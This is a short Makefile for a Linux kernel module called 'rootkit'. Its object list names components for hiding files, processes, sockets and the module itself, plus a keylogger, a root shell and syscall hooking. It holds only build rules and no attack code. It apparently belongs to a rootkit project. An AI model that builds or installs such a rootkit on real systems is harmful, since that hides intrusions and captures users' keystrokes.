obj-m += rootkit.o

rootkit-objs += kernel_functions.o
rootkit-objs += kernel_variables.o
rootkit-objs += load_magic.o
rootkit-objs += vt_channel.o
rootkit-objs += syscall.o
rootkit-objs += file_hiding.o
rootkit-objs += module_hiding.o
rootkit-objs += socket_hiding.o
rootkit-objs += process_hiding.o
rootkit-objs += keylogger.o
rootkit-objs += rootshell.o
rootkit-objs += main.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
